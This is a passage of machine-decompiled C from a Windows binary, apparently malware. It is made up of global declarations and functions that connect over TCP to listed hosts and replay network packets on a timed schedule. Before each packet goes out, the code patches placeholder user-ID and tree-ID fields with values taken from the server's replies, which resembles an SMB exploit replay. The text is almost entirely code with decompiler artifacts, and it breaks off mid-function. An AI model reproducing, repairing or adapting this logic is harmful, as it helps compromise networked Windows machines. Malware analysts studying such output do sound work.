int32_t g1004 = 0; // 0x5aa28c
int32_t g1005 = 0; // 0x5aa290
int32_t g1006 = 0; // 0x5aa294
int32_t g1007 = 0; // 0x5aa298
char * g1008; // 0x5aa29c
int32_t g1009 = 0; // 0x5ac9b0
int32_t g1010 = 0; // 0x5ac9b4
int32_t g1011 = 0; // 0x5ac9b8
int32_t g1012 = 0; // 0x5ac9bc
int32_t g1013 = 0; // 0x5ac9c0
char * g1014; // 0x5ac9c4
int32_t g1015 = 0; // 0x5af0d8
int32_t g1016 = 0; // 0x5af0dc
int32_t g1017 = 0; // 0x5af0e0
int32_t g1018 = 0; // 0x5af0e4
int32_t g1019 = 0; // 0x5af0e8
char * g1020; // 0x5af0ec
int32_t g1021 = 0; // 0x5b1800
int32_t g1022 = 0; // 0x5b1804
int32_t g1023 = 0; // 0x5b1808
int32_t g1024 = 0; // 0x5b180c
int32_t g1025 = 0; // 0x5b1810
char * g1026; // 0x5b1814
int32_t g1027 = 0; // 0x5b3f28
int32_t g1028 = 0; // 0x5b3f2c
int32_t g1029 = 0; // 0x5b3f30
int32_t g1030 = 0; // 0x5b3f34
int32_t g1031 = 0; // 0x5b3f38
char * g1032; // 0x5b3f3c
int32_t g1033 = 0; // 0x5b6650
int32_t g1034 = 0; // 0x5b6654
int32_t g1035 = 0; // 0x5b6658
int32_t g1036 = 0; // 0x5b665c
int32_t g1037 = 0; // 0x5b6660
char * g1038; // 0x5b6664
int32_t g1039 = 0; // 0x5b8d78
int32_t g1040 = 0; // 0x5b8d7c
int32_t g1041 = 0; // 0x5b8d80
int32_t g1042 = 0; // 0x5b8d84
int32_t g1043 = 0; // 0x5b8d88
char * g1044; // 0x5b8d8c
int32_t g1045 = 0; // 0x5bb4a0
int32_t g1046 = 0; // 0x5bb4a4
int32_t g1047 = 0; // 0x5bb4a8
int32_t g1048 = 0; // 0x5bb4ac
int32_t g1049 = 0; // 0x5bb4b0
char * g1050; // 0x5bb4b4
int32_t g1051 = 0; // 0x5bdbc8
int32_t g1052 = 0; // 0x5bdbcc
int32_t g1053 = 0; // 0x5bdbd0
int32_t g1054 = 0; // 0x5bdbd4
int32_t g1055 = 0; // 0x5bdbd8
char * g1056; // 0x5bdbdc
int32_t g1057 = 0; // 0x5c02f0
int32_t g1058 = 0; // 0x5c02f4
int32_t g1059 = 0; // 0x5c02f8
int32_t g1060 = 0; // 0x5c02fc
int32_t g1061 = 0; // 0x5c0300
char * g1062; // 0x5c0304
int32_t g1063 = 0; // 0x5c2a18
int32_t g1064 = 0; // 0x5c2a1c
int32_t g1065 = 0; // 0x5c2a20
int32_t g1066 = 0; // 0x5c2a24
int32_t g1067 = 0; // 0x5c5140
int32_t g1068 = 0; // 0x5c5144
int32_t g1069 = 0; // 0x5c5148
int32_t g1070 = 0; // 0x5c514c
int32_t g1071 = 0; // 0x5c7868
int32_t g1072 = 0; // 0x5c786c
int32_t g1073 = 0; // 0x5c7870
int32_t g1074 = 0; // 0x5c7874
int32_t g1075 = 0; // 0x5c9f90
int32_t g1076 = 0; // 0x5c9f94
int32_t g1077 = 0; // 0x5c9f98
int32_t g1078 = 0; // 0x5c9f9c
int32_t g1079 = 0; // 0x5cc6b8
int32_t g1080 = 0; // 0x5cc6bc
int32_t g1081 = 0; // 0x5cc6c0
int32_t g1082 = 0; // 0x5cc6c4
int32_t g1083 = 0; // 0x5cede0
int32_t g1084 = 0; // 0x5cede4
int32_t g1085 = 0; // 0x5cede8
int32_t g1086 = 0; // 0x5cedec
int32_t g1087 = 0; // 0x5d1508
int32_t g1088 = 0; // 0x5d150c
int32_t g1089 = 0; // 0x5d1510
int32_t g1090 = 0; // 0x5d1514
int32_t g1091 = 0; // 0x5d3c30
int32_t g1092 = 0; // 0x5d3c34
int32_t g1093 = 0; // 0x5d3c38
int32_t g1094 = 0; // 0x5d3c3c
int32_t g1095 = 0; // 0x5d6358
int32_t g1096 = 0; // 0x5d635c
int32_t g1097 = 0; // 0x5d6360
int32_t g1098 = 0; // 0x5d6364
int32_t g1099 = 0; // 0x5d8a80
int32_t g1100 = 0; // 0x5d8a84
int32_t g1101 = 0; // 0x5d8a88
int32_t g1102 = 0; // 0x5d8a8c
int32_t g1103 = 0; // 0x5db1a8
int32_t g1104 = 0; // 0x5db1ac
int32_t g1105 = 0; // 0x5db1b0
int32_t g1106 = 0; // 0x5db1b4
int32_t g1107 = 0; // 0x5dd8d0
int32_t g1108 = 0; // 0x5dd8d4
int32_t g1109 = 0; // 0x5dd8d8
int32_t g1110 = 0; // 0x5dd8dc
int32_t g1111 = 0; // 0x5dfff8
int32_t g1112 = 0; // 0x5dfffc
int32_t g1113 = 0; // 0x5e0000
int32_t g1114 = 0; // 0x5e0004
int32_t g1115 = 0; // 0x5e2720
int32_t g1116 = 0; // 0x5e2724
int32_t g1117 = 0; // 0x5e2728
int32_t g1118 = 0; // 0x5e272c
int32_t g1119 = 0; // 0x5e4e48
int32_t g1120 = 0; // 0x5e4e4c
int32_t g1121 = 0; // 0x5e4e50
int32_t g1122 = 0; // 0x5e4e54
int32_t g1123 = 0; // 0x5e4e58
char * g1124; // 0x5e4e5c
int32_t g1125 = 0; // 0x5e7570
int32_t g1126 = 0; // 0x5e7574
int32_t g1127 = 0; // 0x5e7578
int32_t g1128 = 0; // 0x5e757c
int32_t g1129 = 0; // 0x5e9c98
int32_t g1130 = 0; // 0x5e9c9c
int32_t g1131 = 0; // 0x5e9ca0
int32_t g1132 = 0; // 0x5e9ca4
int32_t g1133 = 0; // 0x5e9ca8
char * g1134; // 0x5e9cac
int32_t g1135 = 0; // 0x5ec3c0
int32_t g1136 = 0; // 0x5ec3c4
int32_t g1137 = 0; // 0x5ec3c8
int32_t g1138 = 0; // 0x5ec3cc
int32_t g1139 = 0; // 0x5eeae8
int32_t g1140 = 0; // 0x5eeaec
int32_t g1141 = 0; // 0x5eeaf0
int32_t g1142 = 0; // 0x5eeaf4
int32_t g1143 = 0; // 0x5f1210
int32_t g1144 = 0; // 0x5f1214
int32_t g1145 = 0; // 0x5f1218
int32_t g1146 = 0; // 0x5f121c
int32_t g1147 = 0; // 0x5f3938
int32_t g1148 = 0; // 0x5f393c
int32_t g1149 = 0; // 0x5f3940
int32_t g1150 = 0; // 0x5f3944
int32_t g1151 = 0; // 0x5f6060
int32_t g1152 = 0; // 0x5f6064
int32_t g1153 = 0; // 0x5f6068
int32_t g1154 = 0; // 0x5f606c
int32_t g1155 = 0; // 0x5f8788
int32_t g1156 = 0; // 0x5f878c
int32_t g1157 = 0; // 0x5f8790
int32_t g1158 = 0; // 0x5f8794
int32_t g1159 = 0; // 0x5f8798
char * g1160; // 0x5f879c
int32_t g1161 = 0; // 0x5faeb0
int32_t g1162 = 0; // 0x5faeb4
int32_t g1163 = 0; // 0x5faeb8
int32_t g1164 = 0; // 0x5faebc
int32_t g1165 = 0; // 0x5fd5d8
int32_t g1166 = 0; // 0x5fd5dc
int32_t g1167 = 0; // 0x5fd5e0
int32_t g1168 = 0; // 0x5fd5e4
int32_t g1169 = 0; // 0x5ffd00
int32_t g1170 = 0; // 0x5ffd04
int32_t g1171 = 0; // 0x692f20
struct _SERVICE_TABLE_ENTRYA * g1172 = NULL; // 0x70f760
struct _OVERLAPPED * g1173 = NULL; // 0x70f864
int32_t g1174 = 0; // 0x70f868
char * g1175; // 0x70f86c
int32_t g1176 = 0; // 0x70f870
int32_t g1177 = 0; // 0x70f874
int32_t g1178 = 0; // 0x70f878
void (****g1179)() = NULL; // 0x70f894
void (****g1180)() = NULL; // 0x70f898
int32_t g1181 = 0x4cee308b; // 0x905a4d
bool g1182 = false; // zf
int32_t * g22 = &g1181; // 0x40b020
int32_t * g23 = &g1181; // 0x40f080
int32_t * g84 = &g24; // 0x42e6dc
char (*g94)[819] = &g35; // 0x42e730
int32_t * g104 = &g1171; // 0x431340

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x40100f
void function_401000(void) {
    // 0x401000
    function_401010();
    function_401030();
}

// Address range: 0x401010 - 0x40102f
void function_401010(void) {
    g4 = &g119;
    int32_t v1;
    int32_t v2;
    int32_t v3;
    function_408200((char *)&v1, (char *)&v2, v3);
}

// Address range: 0x401030 - 0x40103f
void function_401030(void) {
    // 0x401030
    function_409842((int32_t)function_401040);
}

// Address range: 0x401040 - 0x40113f
int32_t function_401040(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1;
    int32_t v2 = &v1; // 0x401050_3
    int32_t v3 = g2; // 0x401054
    g7 = &g119;
    int32_t v4 = g5; // 0x401058
    g2 = 0;
    int32_t v5 = g120;
    g5 = v5;
    int32_t v6 = *(int32_t *)v5; // 0x401063
    g1 = v6;
    v1 = v6;
    int32_t v7; // esi
    int32_t result; // 0x40113b_2
    int32_t v8; // 0x401127
    int32_t v9; // 0x401109
    int32_t v10; // 0x4010f2
    if (g121 == 0) {
        // 0x4010c2
        if (v6 == v5) {
            // 0x4010c2
            // branch -> 0x4010e6
        } else {
            // branch -> 0x4010c6
            while (true) {
                // 0x4010c6
                g4 = v2;
                g3 = v6;
                int32_t v11;
                function_408a10(v11);
                g4 = g7;
                int32_t v12;
                function_4085d0(&v12, (int32_t *)v6, v4);
                g1 = v3;
                if (v3 == g5) {
                    // 0x4010e6
                    // branch -> 0x4010e6
                    // 0x4010e6
                    function_4097fe((char *)g120);
                    v10 = g2;
                    g120 = v10;
                    g121 = v10;
                    v7 = 0;
                    _qm__qm_0_Lockit_std__QAE_XZ();
                    v9 = g1177 - 1;
                    g1 = v9;
                    g1177 = v9;
                    if (v9 == 0) {
                        // 0x401111
                        v7 = g1178;
                        g1178 = g2;
                        // branch -> 0x40111d
                    }
                    // 0x40111d
                    _qm__qm_1_Lockit_std__QAE_XZ();
                    v8 = v7;
                    if (v8 == g2) {
                        // 0x40111d
                        // branch -> 0x401134
                        // 0x401134
                        return g1;
                    }
                    // 0x40112b
                    result = function_4097fe((char *)v8);
                    // branch -> 0x401134
                    // 0x401134
                    return result;
                }
                // 0x4010c6
                v11 = v6;
                v6 = v3;
                // branch -> 0x4010c6
            }
        }
        // 0x4010e6
        function_4097fe((char *)g120);
        v10 = g2;
        g120 = v10;
        g121 = v10;
        v7 = 0;
        _qm__qm_0_Lockit_std__QAE_XZ();
        v9 = g1177 - 1;
        g1 = v9;
        g1177 = v9;
        if (v9 == 0) {
            // 0x401111
            v7 = g1178;
            g1178 = g2;
            // branch -> 0x40111d
        }
        // 0x40111d
        _qm__qm_1_Lockit_std__QAE_XZ();
        v8 = v7;
        if (v8 == g2) {
            // 0x40111d
            result = g1;
            // branch -> 0x401134
        } else {
            // 0x40112b
            result = function_4097fe((char *)v8);
            // branch -> 0x401134
        }
        // 0x401134
        return result;
    }
    int32_t v13 = *(int32_t *)(v5 + 4); // 0x401071
    g3 = v13;
    g5 = v13;
    int32_t v14;
    int32_t v15;
    int32_t v16;
    if (v13 != g1178) {
        int32_t v17 = &g119; // 0x401082
        int32_t v18 = v13; // 0x40107f
        // branch -> 0x40107f
        while (true) {
            // 0x40107f
            g4 = v17;
            g1 = function_4089d0((int32_t *)*(int32_t *)(v18 + 8), v4);
            g5 = *(int32_t *)g5;
            function_4097fe((char *)g3);
            int32_t v19 = g1178; // 0x401092
            int32_t v20 = g5; // 0x40109a
            g3 = v20;
            if (v20 == v19) {
                // 0x4010a0
                // branch -> 0x4010a0
                // 0x4010a0
                *(int32_t *)(g120 + 4) = v19;
                v15 = g120;
                g121 = g2;
                g4 = g7;
                *(int32_t *)v15 = v15;
                v16 = g120;
                *(int32_t *)(v16 + 8) = v16;
                g1 = function_4082b0((int32_t *)(int32_t)&v14, v4);
                // branch -> 0x4010e6
                // 0x4010e6
                function_4097fe((char *)g120);
                v10 = g2;
                g120 = v10;
                g121 = v10;
                v7 = 0;
                _qm__qm_0_Lockit_std__QAE_XZ();
                v9 = g1177 - 1;
                g1 = v9;
                g1177 = v9;
                if (v9 == 0) {
                    // 0x401111
                    v7 = g1178;
                    g1178 = g2;
                    // branch -> 0x40111d
                }
                // 0x40111d
                _qm__qm_1_Lockit_std__QAE_XZ();
                v8 = v7;
                if (v8 == g2) {
                    // 0x40111d
                    // branch -> 0x401134
                    // 0x401134
                    return g1;
                }
                // 0x40112b
                result = function_4097fe((char *)v8);
                // branch -> 0x401134
                // 0x401134
                return result;
            }
            // 0x40107f
            v17 = g7;
            v18 = v20;
            // branch -> 0x40107f
        }
    }
    // 0x4010a0
    *(int32_t *)(v5 + 4) = v13;
    v15 = g120;
    g121 = g2;
    g4 = g7;
    *(int32_t *)v15 = v15;
    v16 = g120;
    *(int32_t *)(v16 + 8) = v16;
    g1 = function_4082b0((int32_t *)(int32_t)&v14, v4);
    // branch -> 0x4010e6
    // 0x4010e6
    function_4097fe((char *)g120);
    v10 = g2;
    g120 = v10;
    g121 = v10;
    v7 = 0;
    _qm__qm_0_Lockit_std__QAE_XZ();
    v9 = g1177 - 1;
    g1 = v9;
    g1177 = v9;
    if (v9 == 0) {
        // 0x401111
        v7 = g1178;
        g1178 = g2;
        // branch -> 0x40111d
    }
    // 0x40111d
    _qm__qm_1_Lockit_std__QAE_XZ();
    v8 = v7;
    if (v8 == g2) {
        // 0x40111d
        result = g1;
        // branch -> 0x401134
    } else {
        // 0x40112b
        result = function_4097fe((char *)v8);
        // branch -> 0x401134
    }
    // 0x401134
    return result;
}

// Address range: 0x401140 - 0x40118f
int32_t function_401140(char * str2, char * str, int32_t a3) {
    int32_t v1 = g5; // 0x401143
    int32_t result = (int32_t)str2;
    int32_t n = 0x1000000 * strlen(str) / 0x1000000; // 0x401159_2
    g6 = n;
    int32_t v2 = result - n; // 0x40115f
    g4 = v2;
    int32_t v3 = v2 + a3; // 0x401161
    int32_t v4;
    if (result > v3) {
        // 0x40117b
        // branch -> 0x40117d
        // 0x40117d
        g5 = v1;
        g3 = v4;
        return 0;
    }
    int32_t strncmp_rc = strncmp(str2, str, n);
    g4 = strncmp_rc;
    g1182 = (strncmp_rc & 1) == 0;
    if ((strncmp_rc & 1) == 0) {
        // 0x40117d
        g5 = v1;
        g3 = v4;
        return result;
    }
    int32_t v5 = result;
    int32_t str3; // 0x401176
    while (true) {
        // 0x401176
        str3 = v5 + 1;
        if (str3 > v3) {
            // 0x40117b
            // branch -> 0x40117d
            // 0x40117d
            g5 = v1;
            g3 = v4;
            return 0;
        }
        int32_t strncmp_rc2 = strncmp((char *)str3, str, g6);
        g4 = strncmp_rc2;
        g1182 = (strncmp_rc2 & 1) == 0;
        if ((strncmp_rc2 & 1) == 0) {
            // break -> 0x40117d
            break;
        }
        v5 = str3;
        // continue -> 0x401176
    }
    // 0x40117d
    g5 = v1;
    g3 = v4;
    return str3;
}

// Address range: 0x401190 - 0x40130f
int32_t function_401190(char * a1, int32_t a2, char * a3, char * a4, char * a5) {
    int32_t v1 = g2; // 0x401192
    g2 = a2;
    int32_t v2 = g7; // 0x401197
    int32_t v3 = (int32_t)a1;
    g7 = v3;
    g5 = v3;
    int32_t v4 = function_401140(a1, "__USERID__PLACEHOLDER__", a2); // 0x4011a6
    int32_t v5 = (int32_t)a3; // ebx
    int32_t v6; // edx
    int32_t v7; // 0x401240
    int32_t v8; // 0x401246
    if (v4 == 0) {
        // 0x401190
        v8 = g5;
        v7 = g2;
        // branch -> 0x401240
    } else {
        int32_t v9 = g7; // 0x4011c2
        int32_t v10 = v4 - v9; // 0x4011c2
        v6 = v10;
        memcpy(a3, (char *)v9, v10 / 4);
        memcpy(a3, (char *)g7, v10 & 3);
        *(char *)(v5 + v6) = *a4;
        char v11 = *(char *)((int32_t)a4 + 1); // 0x4011e2
        *(char *)(v6 + 1 + v5) = v11;
        uint32_t v12 = g2 - v6 - strlen("__USERID__PLACEHOLDER__"); // 0x4011f7
        char * v13 = (char *)(v6 + 2 + v5);
        char * v14 = (char *)(strlen("__USERID__PLACEHOLDER__") + v4);
        memcpy(v13, v14, v12 / 4);
        memcpy(v13, v14, v12 & 3);
        g7 = (int32_t)a1;
        g5 = v5;
        int32_t v15 = g2 - strlen("__USERID__PLACEHOLDER__") + 2; // 0x40123d
        g2 = v15;
        v8 = v5;
        v7 = v15;
        // branch -> 0x401240
    }
    int32_t v16 = function_401140((char *)v8, "__TREEID__PLACEHOLDER__", v7); // 0x401247
    int32_t v17 = 0; // 0x4012ed
    if (v16 != 0) {
        int32_t v18 = g5; // 0x40125d
        char * v19 = (char *)v18;
        int32_t v20 = v16 - v18; // 0x40125f
        v6 = v20;
        char * v21 = (char *)g3;
        memcpy(v21, v19, v20 / 4);
        memcpy(v21, v19, v20 & 3);
        *(char *)(g3 + v6) = *a5;
        char v22 = *(char *)((int32_t)a5 + 1); // 0x401281
        *(char *)(v6 + 1 + g3) = v22;
        uint32_t v23 = g2 - v6 - strlen("__TREEID__PLACEHOLDER__"); // 0x401296
        char * v24 = (char *)(v6 + 2 + g3);
        char * v25 = (char *)(strlen("__USERID__PLACEHOLDER__") + v16);
        memcpy(v24, v25, v23 / 4);
        memcpy(v24, v25, v23 & 3);
        g5 = (int32_t)"__TREEID__PLACEHOLDER__";
        g7 = (int32_t)a1;
        g2 += 2 - strlen("__TREEID__PLACEHOLDER__");
        v17 = v16;
        // branch -> 0x4012e5
    }
    int32_t v26 = v4;
    if (v4 == 0) {
        // 0x4012ed
        if (v17 == 0) {
            // 0x4012f1
            g5 = g3;
            memcpy((char *)g3, (char *)g7, g2 / 4);
            v26 = g2 & 3;
            // branch -> 0x401303
        } else {
            v26 = 0;
        }
    }
    // 0x401303
    memcpy((char *)g5, (char *)g7, v26);
    int32_t result = g2; // 0x401304
    g7 = v2;
    g2 = v1;
    return result;
}

// Address range: 0x401310 - 0x40136f
void function_401310(void) {
    // 0x401310
    g1 = g120;
    int32_t v1 = *(int32_t *)g120; // 0x401316
    int32_t v2 = v1; // esi
    if (v1 == g120) {
        // 0x401365
        return;
    }
    // branch -> 0x40131c
    while (true) {
        // 0x40131c
        closesocket(*(int32_t *)(v1 + 16));
        int32_t v3 = v2; // 0x401325
        int32_t v4 = *(int32_t *)(v3 + 8); // 0x401325
        g4 = g1178;
        int32_t v5; // 0x40135b
        if (v4 == g1178) {
            int32_t v6 = *(int32_t *)(v3 + 4); // 0x401344
            g1 = v6;
            v5 = v6;
            int32_t v7 = v3; // 0x401356
            if (v3 == *(int32_t *)(v6 + 8)) {
                v2 = v6;
                int32_t v8 = *(int32_t *)(v6 + 4); // 0x40134e
                g1 = v8;
                while (v6 == *(int32_t *)(v8 + 8)) {
                    // 0x40134c
                    v6 = v8;
                    v2 = v6;
                    v8 = *(int32_t *)(v6 + 4);
                    g1 = v8;
                    // continue -> 0x40134c
                }
                // 0x401356
                v5 = v8;
                v7 = v6;
                // branch -> 0x401356
            }
            // 0x401356
            if (*(int32_t *)(v7 + 8) != v5) {
                // 0x40135b
                v2 = v5;
                // branch -> 0x40135d
            } else {
                v5 = v7;
            }
          lab_0x40135d_2:
            // 0x40135d
            if (v5 == g120) {
                // break -> 0x401365
                break;
            }
            v1 = v5;
            // continue -> 0x40131c
            continue;
        } else {
            // 0x401332
            v2 = v4;
            int32_t v9 = *(int32_t *)v4; // 0x401334
            g1 = v9;
            if (v9 == g1178) {
                v5 = v4;
                goto lab_0x40135d_2;
            }
            v2 = v9;
            int32_t v10 = *(int32_t *)v9; // 0x40133c
            g1 = v10;
            while (v10 != g1178) {
                // 0x40133a
                v9 = v10;
                v2 = v9;
                v10 = *(int32_t *)v9;
                g1 = v10;
                // continue -> 0x40133a
            }
            // 0x40135d
            v5 = v9;
            // branch -> 0x40135d
            goto lab_0x40135d_2;
        }
    }
    // 0x401365
    // branch -> 0x401365
}

// Address range: 0x401370 - 0x40165f
int32_t function_401370(int32_t a1, int32_t a2, int32_t a3, float64_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, float64_t a16, int32_t a17, int32_t addr, int32_t a19, int32_t a20, int32_t a21, char * a22, int32_t a23, int32_t buf2, int32_t a25, int32_t a26, int32_t a27, int32_t a28) {
    // 0x401370
    int32_t v1;
    struct sockaddr * v2 = (struct sockaddr *)v1; // bp-36
    g1 = 0x2f84;
    int32_t v3;
    function_409860(v3);
    int32_t v4 = g7; // bp-12
    g3 = 0;
    int32_t v5 = g5; // bp-16
    int32_t v6 = 0;
    int32_t dwMilliseconds = GetTickCount();
    int32_t v7 = g3;
    function_401d80();
    int32_t v8 = g120;
    int32_t v9 = v8; // bp-20
    int32_t v10 = *(int32_t *)v8; // 0x4013b5
    int32_t v11 = &dwMilliseconds;
    g4 = &g119;
    g1 = function_4082c0(&dwMilliseconds, v10, v8, v5);
    g7 = (int32_t)&g123;
    int32_t v12 = (int32_t)&v2;
    int32_t v13;
    int32_t length = &v13; // 0x4014f4_0
    int32_t v14 = (int32_t)&g123; // 0x4013cc
    // branch -> 0x4013cc
    while (true) {
        float64_t v15 = 1000.0 * *(float64_t *)(v14 + 0x2720);
        ((int32_t (*)(int32_t))g2)((int32_t)(int64_t)v15);
        int32_t v16 = g1; // 0x4013de
        float80_t v17 = (float80_t)v15 - ((float80_t)v16 - (float80_t)a4); // 0x4013ee
        int32_t v18; // 0x4013f8
        int32_t v19; // 0x40141e
        int32_t v20; // 0x40141a
        int32_t v21; // 0x40141e
        if (v17 <= 0.0L) {
            // if_4013f2_1_false
            bool v22;
            bool v23;
            int32_t v24; // 0x4013f8
            if (v17 >= 0.0L) {
                // if_4013f2_2_false
                v22 = v17 != 0.0L;
                v23 = v17 != 0.0L;
                v24 = 0x4000;
                // branch -> after_if_4013f2_1
            } else {
                v22 = true;
                v23 = false;
                v24 = 0;
            }
            // after_if_4013f2_1
            v18 = (v23 ? 1024 : 0) | v24 | (v22 ? 256 : 0);
            g1 = v16 & -0x10000 | v18 | 0x3000;
            g1182 = (v18 & 0x4100) == 0;
            ((int32_t (*)())g2)();
            v20 = g1;
            v19 = g7;
            v21 = (int32_t)*(int16_t *)v19 | v20 & -0x10000;
            g1 = v21;
            int32_t v25; // 0x40160d
            int32_t v26; // 0x40160d
            int32_t v27; // 0x401645
            if (v21 == 2) {
              lab_0x401433:;
                // 0x401433
                int32_t cp;
                g4 = cp;
                addr = 2;
                inet_addr((char *)cp);
                int32_t host_short;
                g6 = host_short;
                htons((int16_t)host_short);
                v2 = (struct sockaddr *)1;
                int32_t sock_fd = socket(AF_INET, SOCK_STREAM, g3); // 0x401460
                g5 = sock_fd;
                if (sock_fd == -1) {
                    // 0x40162a
                    function_401310();
                    g5 = v11;
                    g7 = v10;
                    g2 = v9;
                    g3 = v5;
                    return -1;
                }
                // 0x401470
                v2 = (struct sockaddr *)&addr;
                if (connect(sock_fd, (struct sockaddr *)&addr, 16) == -1) {
                    // 0x40163a
                    closesocket(g5);
                    // branch -> 0x401640
                    // 0x401640
                    *(int32_t *)((int32_t)&v11 - 4) = 0x401645;
                    function_401310();
                    v27 = g8;
                    *(int32_t *)(v27 - 4) = 1000;
                    *(int32_t *)(v27 - 8) = (int32_t)&g9;
                    Sleep(dwMilliseconds);
                    g5 = *(int32_t *)v27;
                    g7 = *(int32_t *)(v27 + 4);
                    g2 = *(int32_t *)(v27 + 8);
                    g3 = *(int32_t *)(v27 + 12);
                    return g1;
                }
                // 0x401486
                g1 = &a12;
                a8 = *(int32_t *)(g7 + 4);
                v2 = (struct sockaddr *)&a12;
                g4 = &g119;
                g1 = function_408390(&a12, &a8, v11);
                g4 = v20;
                *(int32_t *)(v20 + 16) = g5;
                // branch -> 0x40160d
              lab_0x40160d_6:
                // 0x40160d
                v26 = g7;
                v25 = v26 + 0x2728;
                g7 = v25;
                g1182 = v26 == 0x5fd5e0;
                if (v25 >= 0x5ffd08) {
                    // break -> 0x40161f
                    break;
                }
                v14 = v25;
                a4 = v20;
                // continue -> 0x4013cc
                continue;
            } else {
              lab_0x4014b1:;
                // 0x4014b1
                float64_t v28;
                if (v21 == 3) {
                    // 0x4014b7
                    g1 = &v7;
                    v2 = (struct sockaddr *)&buf2;
                    g4 = &g119;
                    v7 = *(int32_t *)(v19 + 4);
                    function_408390(&buf2, &v7, v11);
                    int32_t v29 = (int32_t)a22;
                    g6 = v29;
                    g1 = closesocket(*(int32_t *)(v29 + 16));
                    // branch -> 0x40160d
                    goto lab_0x40160d_6;
                } else {
                    int32_t v30 = g3; // 0x4014e8
                    if (v21 == v30) {
                        // 0x4014ed
                        g5 = length;
                        memset((char *)&v13, 0, 2500);
                        int32_t v31 = g7; // 0x40150d
                        int32_t v32 = *(int32_t *)(v31 + 8); // 0x40150d
                        v2 = (struct sockaddr *)&v4;
                        int32_t v33;
                        function_401190((char *)(v31 + 12), v32, (char *)&v13, (char *)&v4, (char *)&v33);
                        g5 = length;
                        int32_t v34 = *(int32_t *)(g7 + 4); // 0x401525
                        g1 = v34;
                        v2 = (struct sockaddr *)&a22;
                        g4 = &g119;
                        a6 = v34;
                        function_408390((int32_t *)&a22, &a6, v11);
                        g4 = a20;
                        int32_t sock = *(int32_t *)(a20 + 16); // 0x40154d
                        g6 = sock;
                        int32_t buf;
                        int32_t v35 = send(sock, (char *)&buf, length, g3); // 0x401552
                        g1 = v35;
                        if (v35 != -1) {
                            goto lab_0x40160d_6;
                        }
                        // 0x401640
                        *(int32_t *)(v12 - 4) = 0x401645;
                        function_401310();
                        v27 = g8;
                        *(int32_t *)(v27 - 4) = 1000;
                        *(int32_t *)(v27 - 8) = (int32_t)&g9;
                        Sleep(dwMilliseconds);
                        g5 = *(int32_t *)v27;
                        g7 = *(int32_t *)(v27 + 4);
                        g2 = *(int32_t *)(v27 + 8);
                        g3 = *(int32_t *)(v27 + 12);
                        return g1;
                    }
                    // 0x401565
                    if (v21 != 1) {
                        goto lab_0x40160d_6;
                    }
                    int32_t v36 = *(int32_t *)(v19 + 4); // 0x40156f
                    g1 = v36;
                    v2 = (struct sockaddr *)&a14;
                    g4 = &g119;
                    v6 = v36;
                    dwMilliseconds = v30;
                    function_408390(&a14, &v6, v11);
                    g4 = a12;
                    int32_t sock2 = *(int32_t *)(a12 + 16); // 0x40159f
                    g6 = sock2;
                    int32_t v37 = recv(sock2, (char *)&buf2, 2048, g3); // 0x4015a4
                    g1 = v37;
                    if (v37 == -1) {
                        // 0x401640
                        *(int32_t *)(v12 - 4) = 0x401645;
                        function_401310();
                        v27 = g8;
                        *(int32_t *)(v27 - 4) = 1000;
                        *(int32_t *)(v27 - 8) = (int32_t)&g9;
                        Sleep(dwMilliseconds);
                        g5 = *(int32_t *)v27;
                        g7 = *(int32_t *)(v27 + 4);
                        g2 = *(int32_t *)(v27 + 8);
                        g3 = *(int32_t *)(v27 + 12);
                        return g1;
                    }
                    int32_t v38 = g7; // 0x4015b2
                    if (*(int32_t *)(v38 + 8) < 4) {
                        goto lab_0x40160d_6;
                    }
                    int32_t v39 = v38 + 12; // 0x4015b8
                    g5 = v39;
                    if (_stricmp((char *)v39, "treeid") == 0) {
                        // 0x4015ce
                        int32_t v40;
                        g4 = g4 & -256 | v40 & 255;
                        // branch -> 0x4015e4
                    }
                    int32_t v41 = _stricmp((char *)g5, "userid"); // 0x4015ea
                    g1 = v41;
                    if (v41 != 0) {
                        goto lab_0x40160d_6;
                    }
                    // 0x4015f7
                    int32_t v42;
                    g6 = g6 & -256 | v42 & 255;
                    int32_t v43;
                    g1 = v43 & 255;
                    v9 = 0x1000000 * v42 / 0x1000000;
                    // branch -> 0x40160d
                    goto lab_0x40160d_6;
                    // 0x40160d
                    v26 = g7;
                    v25 = v26 + 0x2728;
                    g7 = v25;
                    g1182 = v26 == 0x5fd5e0;
                    if (v25 >= 0x5ffd08) {
                        // break -> 0x40161f
                        break;
                    }
                    v14 = v25;
                    a4 = v28;
                    // continue -> 0x4013cc
                    continue;
                }
                // 0x40160d
                v26 = g7;
                v25 = v26 + 0x2728;
                g7 = v25;
                g1182 = v26 == 0x5fd5e0;
                if (v25 >= 0x5ffd08) {
                    // break -> 0x40161f
                    break;
                }
                v14 = v25;
                a4 = v28;
                // continue -> 0x4013cc
                continue;
            }
        }
        // after_if_4013f2_1
        v18 = 0;
        g1 = v16 & -0x10000 | v18 | 0x3000;
        g1182 = (v18 & 0x4100) == 0;
        ((int32_t (*)())g2)();
        v20 = g1;
        v19 = g7;
        v21 = (int32_t)*(int16_t *)v19 | v20 & -0x10000;
        g1 = v21;
        if (v21 == 2) {
            goto lab_0x401433;
        }
        goto lab_0x4014b1;
    }
    // 0x40161f
    g5 = v11;
    g7 = v10;
    g2 = v9;
    g3 = v5;
    return g1;
}

// Address range: 0x401660 - 0x4017af
int64_t function_401660(int64_t a1, int32_t a2, int32_t a3) {
    int32_t lpFrequency = g7; // bp-24
    int32_t v1 = g5; // 0x40166d
    int32_t lpPerformanceCount = 0; // bp-32
    int32_t v2 = __alldiv(a1, 0xf4240); // 0x401677_5
    lpPerformanceCount = 0;
    __allrem((int32_t)a1, a2, 0xf4240, 0);
    int32_t v3 = 1000 * v2; // 0x401695
    int64_t v4 = v3;
    int64_t lpPerformanceCount2 = v4; // bp-12
    if (v2 >= 1) {
        int32_t v5 = (int32_t)(0x431bde83 * v4 / 0x100000000) / 0x40000; // 0x4016a7
        Sleep((v5 >> 31) + v5 + 1000 * v2);
        return 25 * v2;
    }
    bool v6 = QueryPerformanceFrequency((struct _LARGE_INTEGER *)&lpFrequency); // 0x4016e3
    if (!v6) {
        uint64_t result = 0x431bde83 * (int64_t)v3; // 0x4016f2
        int32_t v7 = (int32_t)(result / 0x100000000) / 0x40000; // 0x4016f4
        Sleep((v7 >> 31) + v7);
        return result;
    }
    // 0x40170c
    g115 = 1.0e-9L * (float80_t)lpFrequency;
    _ftol();
    int32_t result2 = g6; // 0x401733
